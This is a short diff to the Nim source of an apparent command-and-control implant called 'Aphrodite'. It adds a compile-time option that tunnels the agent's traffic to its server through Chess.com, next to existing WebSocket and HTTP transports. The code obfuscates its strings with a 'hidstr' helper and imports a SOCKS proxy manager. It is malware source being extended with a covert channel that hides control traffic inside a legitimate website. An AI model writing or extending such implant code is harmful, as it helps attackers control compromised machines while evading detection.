@@ -4,6 +4,8 @@ import core/jobs, proxy/socks_mgr
 
 when defined(c2ProfileWs):
   import transport/websocket
+elif defined(c2ProfileChesscom):
+  import transport/chesscom
 else:
   import transport/http
 
@@ -422,6 +424,8 @@ proc run*(ag: AphroditeAgent) =
   stderr.writeLine(hidstr("[*] Aphrodite starting — UUID=") & ag.payloadUUID)
   when defined(c2ProfileWs):
     stderr.writeLine(hidstr("[*] C2 (WS): ws://") & WsHost & ":" & $WsPort & "/" & WsPath)
+  elif defined(c2ProfileChesscom):
+    stderr.writeLine(hidstr("[*] C2 (Chess.com): collections / agent→serveur via Mythic chesscom"))
   else:
     stderr.writeLine(hidstr("[*] C2 (HTTP): ") & C2BaseUrl & C2Endpoint)
 
